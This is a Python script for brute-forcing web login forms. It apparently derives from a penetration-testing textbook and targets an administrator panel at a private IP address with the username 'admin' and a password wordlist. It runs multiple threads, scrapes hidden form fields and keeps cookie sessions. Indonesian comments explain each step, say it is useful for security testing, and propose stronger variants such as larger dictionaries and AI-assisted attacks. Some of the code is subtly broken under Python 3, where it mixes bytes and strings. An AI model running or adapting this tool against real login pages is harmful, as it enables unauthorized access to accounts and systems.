import http.cookiejar
import queue
import threading
import urllib.error
import urllib.parse
import urllib.request
from abc import ABC
from html.parser import HTMLParser

# general settings
user_thread = 10
username = "admin"
wordlist_file = "cain.txt"
resume = None

# target specific settings
target_url = "http://192.168.112.131/administrator/index.php"
target_post = "http://192.168.112.131/administrator/index.php"

username_field = "username"
password_field = "passwd"

success_check = "Administration - Control Panel"


class BruteParser(HTMLParser, ABC):
    def __init__(self):
        HTMLParser.__init__(self)
        self.tag_results = {}

    def handle_starttag(self, tag, attrs):
        if tag == "input":
            tag_name = None
            for name, value in attrs:
                if name == "name":
                    tag_name = value
                if tag_name:
                    self.tag_results[tag_name] = value


class Bruter(object):
    def __init__(self, user, words_q):
        self.username = user
        self.password_q = words_q
        self.found = False
        print("Finished setting up for: %s" % user)

    def run_bruteforce(self):
        for i in range(user_thread):
            t = threading.Thread(target=self.web_bruter)
            t.start()

    def web_bruter(self):
        while not self.password_q.empty() and not self.found:
            brute = self.password_q.get().rstrip()
            jar = http.cookiejar.FileCookieJar("cookies")
            opener = urllib.request.build_opener(
                urllib.request.HTTPCookieProcessor(jar))

            response = opener.open(target_url)

            page = response.read()

            print("Trying: %s : %s (%d left)" % (
                self.username, brute, self.password_q.qsize()))

            # parse out the hidden fields
            parser = BruteParser()
            parser.feed(page)

            post_tags = parser.tag_results

            # add our username and password fields
            post_tags[username_field] = self.username
            post_tags[password_field] = brute

            login_data = urllib.parse.urlencode(post_tags)
            login_response = opener.open(target_post, login_data)

            login_result = login_response.read()

            if success_check in login_result:
                self.found = True

                print("[*] Bruteforce successful.")
                print("[*] Username: %s" % username)
                print("[*] Password: %s" % brute)
                print("[*] Waiting for other threads to exit...")


def build_wordlist(wordlst_file):
    # read in the word list
    fd = open(wordlst_file, "r")
    raw_words = [line.rstrip('\n') for line in fd]
    fd.close()

    found_resume = False
    word_queue = queue.Queue()

    for word in raw_words:
        word = word.rstrip()
        if resume is not None:
            if found_resume:
                word_queue.put(word)
            else:
                if word == resume:
                    found_resume = True
                    print("Resuming wordlist from: %s" % resume)
        else:
            word_queue.put(word)
    return word_queue


words = build_wordlist(wordlist_file)
bruter_obj = Bruter(username, words)
bruter_obj.run_bruteforce()

# ====================================================================================================================================================== # 

# Program ini adalah sebuah alat untuk melakukan serangan brute force pada sebuah form login web. Berikut adalah alur kerja programnya:

# Impor modul-modul yang diperlukan: http.cookiejar, queue, threading, urllib.error, urllib.parse, urllib.request, ABC dari modul abc, dan HTMLParser dari modul html.parser.

# Tentukan beberapa pengaturan umum seperti jumlah thread pengguna, username yang akan diserang, nama file wordlist, dan pengaturan terkait target seperti URL target dan field-field pada form login.

# Definisikan kelas BruteParser yang merupakan subclass dari HTMLParser dan ABC. Kelas ini digunakan untuk mem-parsing halaman web dan menemukan tag-tag input di dalamnya.

# Definisikan kelas Bruter yang berisi fungsi-fungsi untuk melakukan serangan brute force. Kelas ini memiliki metode run_bruteforce() yang memulai serangan dengan membuat beberapa thread dan memanggil metode web_bruter().

# Metode web_bruter() melakukan serangan brute force dengan mengambil kata-kata dari antrian kata-kata (queue) yang disediakan dan mencoba setiap kata untuk login ke situs target.

# Setelah mendapatkan respon dari server, program akan memeriksa apakah login berhasil dengan memeriksa keberadaan string success_check di dalam respon.

# Jika login berhasil, program akan mencetak informasi bahwa serangan brute force berhasil dan mencetak username dan password yang berhasil ditemukan.

# Fungsi build_wordlist() digunakan untuk membangun antrian kata-kata dari file wordlist yang disediakan. Jika resume telah ditentukan (biasanya untuk melanjutkan serangan yang dihentikan sebelumnya), fungsi akan memuat kata-kata dari titik terakhir serangan.

# Antrian kata-kata dibangun dan objek Bruter dibuat dengan menerima antrian kata-kata dan username.

# Metode run_bruteforce() dari objek Bruter dipanggil untuk memulai serangan brute force.

# Dengan demikian, program ini secara iteratif mencoba kombinasi username dan kata sandi dari file wordlist pada form login situs web yang ditentukan, sampai berhasil login atau habis kata sandi yang dicoba.

# ============================================================================================================================================================================================================================================================================== # 

# Berikut adalah penjelasan mengenai fungsi, manfaat, cara penggunaan, dan pengembangan potensial dari program ini:

# Fungsi:

# Program ini dirancang untuk melakukan serangan brute force pada form login sebuah situs web.
# Fungsi utamanya adalah mencoba kombinasi username dan password dari sebuah wordlist untuk masuk ke dalam sistem tanpa otorisasi.

# Manfaat:

# Keamanan Sistem: Program ini dapat membantu administrator sistem untuk menguji keamanan sistem mereka dengan mengidentifikasi kelemahan dalam sistem autentikasi.
# Pengujian Sandi: Penggunaan program ini juga dapat membantu pengguna untuk menguji kekuatan sandi-sandi yang mereka gunakan, dengan mencoba serangan brute force menggunakan wordlist yang umum.
# Pengembangan Keamanan: Dapat digunakan oleh pengembang atau analis keamanan untuk menguji keamanan aplikasi web dan mendeteksi kerentanan pada proses autentikasi.

# Cara Penggunaan:

# Pengguna harus menyediakan file wordlist yang berisi daftar kata sandi yang akan dicoba.
# Pengguna juga perlu menentukan username dan URL target.
# Setelah persiapan, pengguna dapat menjalankan program, yang akan secara otomatis mencoba semua kombinasi dari wordlist untuk masuk ke dalam sistem dengan username yang ditentukan.

# Pengembangan:

# Penambahan Fungsionalitas: Program ini dapat dikembangkan dengan menambahkan fitur-fitur seperti mendukung autentikasi dua faktor, mengelola sesi login, atau memperluas kemampuan parsing untuk menangani kasus-kasus yang lebih kompleks.
# Optimalisasi Kinerja: Dapat dioptimalkan dengan mengimplementasikan algoritma-algoritma yang lebih efisien untuk mempercepat proses brute force.
# Pengembangan Interface: Dapat dikembangkan dengan menambahkan antarmuka pengguna grafis (GUI) untuk memudahkan penggunaan dan pemantauan proses serangan.
# Peningkatan Keamanan: Program ini juga dapat diperluas untuk mencoba serangan bruteforce dengan teknik-teknik yang lebih canggih, seperti menggunakan kamus yang lebih luas atau menerapkan serangan dengan kecerdasan buatan (AI).
# Dengan demikian, program ini bukan hanya merupakan alat yang berguna untuk menguji keamanan sistem, tetapi juga dapat dijadikan sebagai basis untuk pengembangan lebih lanjut dalam pengujian keamanan dan pengembangan aplikasi web.

# ======================================================================================================================================================================================================================================================= # 